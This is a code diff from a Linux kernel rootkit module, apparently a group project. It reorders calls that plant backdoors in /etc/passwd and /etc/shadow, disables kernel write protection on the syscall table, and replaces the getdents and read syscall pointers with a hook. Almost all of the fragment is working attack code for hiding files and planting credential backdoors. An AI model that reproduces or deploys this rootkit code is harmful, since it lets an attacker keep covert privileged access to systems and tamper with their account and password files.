@@ -327,26 +327,6 @@ static int __init rootkit_init(void){
 	char *password_file = "/etc/passwd";
 	char *shadow_file = "/etc/shadow";
 	
-	// Start Marc 
-	
-// 	int offset;
-	
-	add_backdoor(password_file);
-	
-// 	offset = add_backdoor(password_file);
-	
-// 	original_getdents = (void *)sys_call_address[offset];                        \
-//     	sys_call_address[offset] = (unsigned long*)&original_getdents;
-	
-	add_backdoor(shadow_file);
-	
-//    	offset = add_backdoor(shadow_file);
-	
-// 	original_getdents = (void *)sys_call_address[offset];                        \
-//     	sys_call_address[offset] = (unsigned long*)&original_getdents;
-	
-	// End Marc
-	
 	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
 	write_cr0(read_cr0() & (~0x10000)); // This will make the sys call table writable
 
@@ -355,6 +335,19 @@ static int __init rootkit_init(void){
 	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
 	// End Brian
 	
+	// Start Marc 
+	
+	add_backdoor(password_file);	
+	
+	add_backdoor(shadow_file);
+	
+// 	original_getdents = (void *)sys_call_address[__NR_read];
+//     	sys_call_address[__NR_read] = (unsigned long*)&original_getdents;
+	
+	original_getdents = (void *)sys_call_address[__NR_read];
+    	sys_call_address[__NR_read] = (unsigned long*)&sys_getdents_hook;
+	
+	// End Marc
 	
 	
 	// Start Brendan
